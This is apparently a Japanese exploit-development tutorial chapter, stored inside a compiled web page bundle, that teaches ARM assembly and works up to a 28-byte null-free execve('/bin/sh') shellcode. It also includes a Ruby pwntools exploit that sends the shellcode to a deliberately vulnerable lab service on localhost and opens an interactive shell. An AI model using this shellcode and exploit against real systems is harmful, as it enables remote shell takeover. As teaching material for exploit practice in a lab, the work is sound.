(window.webpackJsonp=window.webpackJsonp||[]).push([[8],{214:function(t,a,s){"use strict";s.r(a);var e=s(0),n=Object(e.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"_1-crafting-shellcode"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-crafting-shellcode","aria-hidden":"true"}},[t._v("#")]),t._v(" 1. Crafting Shellcode 🐚")]),t._v(" "),s("p",[t._v("第1章では、Exploitには欠かせないシェルコード作成を通して、ARM アセンブリの基本的な構文や仕組みについて簡単にご説明をします。最後に、実際に作成したシェルコードを用いて、演習問題でシェルを奪取する練習をします。")]),t._v(" "),s("h2",{attrs:{id:"_1-1-arm-アセンブリ基礎"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-arm-アセンブリ基礎","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.1 ARM アセンブリ基礎")]),t._v(" "),s("p",[t._v("ARM アーキテクチャは、RISC（Reduced Instruction Set Computing)）で、ロード/ストアなアーキテクチャです。メモリへのアクセスはレジスタを介したロード、ストア命令のみです。ARM の主要なレジスタには、r0 ~ r15レジスタとcpsrレジスタなどがあります。特にr11 ~ r15ジレスタは特殊な用途に使われるため別名が付けられています。以下にレジスタの概要をまとめます。")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"center"}},[t._v("レジスタ")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("概要")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r0")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("関数の戻り値の保存、関数の第1引数に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r1")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("関数の第2引数に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r2")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("関数の第3引数に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r3")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("関数の第4引数に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r4 ~ r8")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("汎用的に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r8")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("汎用的に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r9")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("汎用的に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r10")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("汎用的に利用")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r11")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("フレームポインタ（別名fp）")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r12")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("インストラクションポインタ（別名ip）")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r13")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("スタックポインタ（別名sp）")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r14")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("リンクレジスタ（別名lr）")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("r15")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("プログラムカウンタ（別名pc）")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("cpsr")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("カレントプログラムモードレジスタ")])])])]),t._v(" "),s("p",[t._v("cpsrレジスタはx86のeflagsレジスタのようなものでフラグ管理をしています。特に下位5bit目のフラグは重要な値になっており、ARMモードとThumbモードと呼ばれる2つのモードの状態を示す役割を持っています。ARMモードが基本的なモードです。Thumbモードについては後述します。")]),t._v(" "),s("p",[t._v("ARM アセンブリにはとても多くの命令があります。よく使われる代表的な命令を以下に示します。")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"left"}},[t._v("命令")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("動作")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("命令")]),t._v(" "),s("th",{staticStyle:{"text-align":"left"}},[t._v("動作")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("MOV")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("値をコピーする")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("PUSH")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("スタックに値をpushする")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("MVN")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("値の2の補数をコピーする")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("POP")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("スタックから値をpopする")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("ADD/SUB")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("加算/減算を行う")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("LDR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("メモリから値をロードする")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("AND/OR/EOR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("論理積/論理和/排他的論理和を行う")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("STR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("メモリに値をストアする")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("LSL/LSR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("論理左/右シフトを行う")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("B")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("制御を無条件に移す")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("ASR")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("算術右シフトを行う")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("BL")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("次の命令のアドレスをlrレジスタに格納し、制御を移す")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"left"}},[t._v("CMP")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("値を比較し、csprレジスタの値を更新する")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("BX")]),t._v(" "),s("td",{staticStyle:{"text-align":"left"}},[t._v("制御を無条件に移す。飛び先のアドレスの末尾1bitによりモードを変更する")])])])]),t._v(" "),s("p",[t._v("実際にARMアセンブリでプログラムを作成してみましょう。"),s("code",[t._v("Hello")]),t._v(" を出力するプログラム"),s("code",[t._v("hello.asm")]),t._v(" を作成します。様々な命令を紹介するために少し冗長に構築しています。ご存知の通り命令の種類はとても多いので、一部のみ取り扱います。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('.text\n.global _start\n_start:\n        eor r0, r0     @ r0 = 0\n        add r0, #1     @ r0 += 1\n        adr r1, s      @ r1 = &s\n        mov r2, #6     @ r2 = 6\n        mov r7, #4     @ r7 = 4\n        svc 0          @ write(1, &s, 6)\n        eor r0, r0     @ r0 = 0\n        add r7, r0, #1 @ r7 = 1\n        svc 0          @ exit(0)\ns:\n  .asciz "Hello\\n"\n')])])]),s("p",[t._v("各行の命令について補足していきます。eor 命令は、xorを行う命令です。引数に同じr0 レジスタを取っているため0初期化していることがわかります。add 命令は、加算を行う命令です。2番目のオペランドは、即値を表しています。したがって本命令は、r0にr0+1を代入する命令になっています。adr 命令は、ラベルのアドレスを第1オペランドに代入する用途で使っています。mov 命令は、値を代入する命令です。svc 命令は、システムコールを発行する命令です。システムコールを直接呼ぶ場合は、r7レジスタにシステムコール番号、r0 ~ r6レジスタに引数をセットして、svc 命令を実行します。また、戻り値はr0レジスタにセットされます。また、svc 命令のオペランドは基本的に無視されます。ここでは、r7 レジスタに4が入っているためwrite システムコールを発行し、"),s("code",[t._v("Hello\\n")]),t._v(" を出力します。その後の3命令はもう読み解けるでしょう。システムコール番号を調べる際には、"),s("code",[t._v("ausyscall")]),t._v(" コマンドが便利です。以下のようにシステムコール名を与えることで、システムコール番号を表示してくれます。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ ausyscall "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),t._v("              "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v("\nwritev             "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("146")]),t._v("\npwrite64           "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("181")]),t._v("\npciconfig_write    "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("273")]),t._v("\npwritev            "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("362")]),t._v("\nprocess_vm_writev  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("377")]),t._v("\npwritev2           "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("393")]),t._v("\n")])])]),s("p",[t._v("また、本コードから実行ファイルを作成する際には、以下のように"),s("code",[t._v("as")]),t._v(" と"),s("code",[t._v("ld")]),t._v(" コマンドを用います。実行すると前述した通り文字列を表示して終了します。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ as hello.asm -o hello.o\n$ ld hello.o -o hello\n$ ./hello\nHello\n")])])]),s("h3",{attrs:{id:"thumb-モード"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#thumb-モード","aria-hidden":"true"}},[t._v("#")]),t._v(" Thumb モード")]),t._v(" "),s("p",[t._v("ARMには、通常のARMモードとThumbモードの2つのモードが存在します。以下に主な違いを示します。")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",{staticStyle:{"text-align":"center"}},[t._v("観点")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("ARM モード")]),t._v(" "),s("th",{staticStyle:{"text-align":"center"}},[t._v("Thumb モード")])])]),t._v(" "),s("tbody",[s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("命令語の長さ")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("4 byte")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("2 byte")])]),t._v(" "),s("tr",[s("td",{staticStyle:{"text-align":"center"}},[t._v("扱える汎用レジスタの数")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("16個")]),t._v(" "),s("td",{staticStyle:{"text-align":"center"}},[t._v("8個")])])])]),t._v(" "),s("p",[t._v("ARM モードとThumb モードの切り替えには、BX 命令とBLX 命令が利用されます。"),s("code",[t._v("BX r0")]),t._v(" のようにレジスタ指定で制御が移る場合は、レジスタの中身が偶数であればARM モード、奇数であればThumb モードに切り替わります。よくある例として、"),s("code",[t._v("add r3, pc, #1; bx r3")]),t._v(" を実行すると、r3 レジスタには、pc+1の奇数のアドレスが格納され、そのアドレスに対してジャンプするため、元がARM モードの場合はThumb モードに切り替わります。")]),t._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",[t._v("Exploit開発においては、Thumbモードは命令語の長さが短いため、長さ制限などがある場合にはとても便利です。")])]),t._v(" "),s("h2",{attrs:{id:"_1-2-シェルコード作成"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-シェルコード作成","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.2 シェルコード作成")]),t._v(" "),s("p",[t._v("最も代表的なシェルコードは、"),s("code",[t._v('execve("/bin/sh", NULL, NULL)')]),t._v(" を実行することです。これをリモート側のサーバ上で実行することで、リモートサーバのシェルを奪取することができます。ARM では "),s("code",[t._v("execve")]),t._v(" システムコールの番号は、11となっています。そのため、r7 レジスタには11を設定する必要があります。引数にはr0レジスタに"),s("code",[t._v("/bin/sh")]),t._v(" のアドレス、r1レジスタとr2レジスタには0を設定する必要があります。この状態で、svc 命令を実行することでシェルを起動することができます。以下にシェルコードの例を示します。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('.text\n.global _start\n\n_start:\n        .code 32\n        add r3, pc, #1\n        bx r3\n\n        .code 16\n        adr r0, s\n        mov r7, #11\n        eor r1, r1\n        eor r2, r2\n        strb r2, [r0, #7]\n        svc #1\ns:      .asciz "/bin/shA"\n')])])]),s("p",[t._v("ここでは、Thumbモードも用いてバイト数を削る試みもしています。"),s("code",[t._v("bx r3")]),t._v(" でジャンプする際に"),s("code",[t._v("adr r0, s")]),t._v(" のアドレス+1した値に飛ぼうとしてます（ARMではPCは実行中の命令+8を指す）。これにより"),s("code",[t._v("adr r0, s")]),t._v(" からはThumb モードで実行されます。文字列"),s("code",[t._v("s")]),t._v(" では、末尾に"),s("code",[t._v("A")]),t._v("が余分についています。本来であればNULL終端をさせたいところですが、Buffer Overflowを招く代表的なstrcpy関数などでは、NULL終端してしまいます。そのため攻撃用のペイロードのコピーが意図しないところで止まる可能性があります。そこで、"),s("code",[t._v("strb r2, [r0, #7]")]),t._v(" を使って、文字列"),s("code",[t._v("s")]),t._v(" のアドレス+7をしたアドレス（"),s("code",[t._v("A")]),t._v("のアドレス）に対して、r2ジレスタの値をストアしています。r2 レジスタは、1つ前の命令で0初期化しているため、本処理は、"),s("code",[t._v("A")]),t._v(" を"),s("code",[t._v("\\x00")]),t._v(" に置き換える処理になっています。生の値として"),s("code",[t._v("\\x00")]),t._v(" を埋め込むのではなく、コードの実行中に"),s("code",[t._v("\\x00")]),t._v(" に置き換えることでNULLが無いシェルコードを実現しています。Exploitに利用する際にはNULLが存在しないシェルコードを利用することが望ましいです。では、実際にアセンブルして実行ファイルを作成し、中身を見てみましょう。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ as shellcode.asm -o shellcode.o\n$ ld shellcode.o -o shellcode.bin\n$ objdump -d shellcode.bin\n\nshellcode.bin:     "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("file")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("format")]),t._v(" elf32-littlearm\n\n\nDisassembly of section .text:\n\n00010054 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_start"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10054")]),t._v(":       e28f3001        "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v("     r3, pc, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#1")]),t._v("\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10058")]),t._v(":       e12fff13        bx      r3\n   1005c:       a002            "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v("     r0, pc, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#8      ; (adr r0, 10068 <s>)")]),t._v("\n   1005e:       270b            movs    r7, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#11")]),t._v("\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10060")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4049")]),t._v("            eors    r1, r1\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10062")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4052")]),t._v("            eors    r2, r2\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10064")]),t._v(":       71c2            strb    r2, "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("r0, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#7]")]),t._v("\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10066")]),t._v(":       df01            svc     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\n\n00010068 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10068")]),t._v(":       6e69622f        .word   0x6e69622f\n   1006c:       4168732f        .word   0x4168732f\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10070")]),t._v(":       00              .byte   0x00\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10071")]),t._v(":       00              .byte   0x00\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10072")]),t._v(":       46c0            nop                     "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("mov r8, r8"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[t._v("上記の通り、0x1006c までの命令の16進数に"),s("code",[t._v("00")]),t._v("が含まれていないことがわかります。")]),t._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",[s("code",[t._v("shellcode.bin")]),t._v(" は実行できるのですが、正しく実行されずに終了してしまいます。それは、"),s("code",[t._v("A")]),t._v("を"),s("code",[t._v("\\x00")]),t._v("で置き換える処理において、書き込み権限がないためです。しかしながら、Exploitに組み込み実行する際は、ほとんどの場合シェルコード自体が存在するメモリの書き込み権限はあるため正常に動作します。")])]),t._v(" "),s("h2",{attrs:{id:"_1-3-シェルコードを用いたシェル奪取"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-3-シェルコードを用いたシェル奪取","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.3 シェルコードを用いたシェル奪取")]),t._v(" "),s("p",[t._v("ここでは他の章でも使っていく演習問題を用いた攻撃環境の構築方法についてご紹介します。ここでは、Raspbian側でsocatを用いてバイナリファイルを特定のポートで待ち受けて、そこへ向けて攻撃していきます。以下のようにして実行します。ここでは、"),s("code",[t._v("shellcode")]),t._v("という実行ファイルを8888/tcp で待受させます。このファイルは入力を受け取り、それを実行するプログラムになっています。送ったシェルコードがそのまま実行されてしまうとても危険なプログラムです。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ socat tcp-l:8888,reuseaddr,fork exec:./shellcode\n")])])]),s("p",[t._v("上記を実行後、ホスト環境から接続すると以下のような応答が帰ってくるはずです。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" localhost "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8888")]),t._v("\nGive me a shellcode: \n")])])]),s("p",[t._v("これで攻撃環境の構築は終了です。次に、実際のExploit コードを作成していきますが、その前に "),s("a",{attrs:{href:"#%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E4%BD%9C%E6%88%90"}},[t._v("1.2 シェルコード作成")]),t._v(" で作成したシェルコードをスクリプト言語などで扱えるようにします。シェルコードとして抽出する必要があるのは、アセンブリ言語で作成した部分のみなので、以下のようにして取り出します。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ objcopy -O binary shellcode.bin shellcode_hex.bin\n$ hexdump -v -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\""),s("span",{pre:!0,attrs:{class:"token entity",title:"\\\\"}},[t._v("\\\\")]),t._v('""x" 1/1 "%02x" ""\'')]),t._v(" shellcode_hex.bin\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x01"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x30"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x8f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xe2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x13"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xff"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x2f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xe1"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x02"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xa0"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x0b"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x27"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x49"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x40"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x52"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x40"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xc2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x71"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x01"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xdf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x2f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x62"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x69"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x6e"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x2f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x73"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x68"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x41\n")])])]),s("p",[t._v("8888/tcp と接続して、このシェルコードを送るExploit コードを以下に示します。")]),t._v(" "),s("div",{staticClass:"language-ruby extra-class"},[s("pre",{pre:!0,attrs:{class:"language-ruby"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#!/usr/bin/env ruby")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#coding: ascii-8bit")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("require")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'pwn'")]),t._v("\n\nhost "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'localhost'")]),t._v("\nport "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8888")]),t._v("\nz "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("Sock")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("host")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port\nz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('": "')]),t._v("\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x0b\\x27\\x49\\x40\\x52\\x40\\xc2\\x71\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41"')]),t._v("\nputs "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"[*] shellcode length: '),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("#{")]),t._v("payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),s("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("}")])]),t._v('"')]),t._v("\nz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline payload\nz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interact\n")])])]),s("p",[t._v("本コードを実行すると以下のように、Raspbian 内部のシェルを操作できるようになっていることがわかります。また、このシェルコードの長さは、28byteでした。")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ ./solve.rb\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" shellcode length: "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("28")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Switching to interactive mode\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("uid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("gid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("groups")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("adm"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",20"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dialout"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",24"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cdrom"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",27"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sudo"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",29"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("audio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",44"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("video"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",46"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("plugdev"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",60"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("games"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",100"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("users"),s("span",{pre:!0,attrs:{class:"token 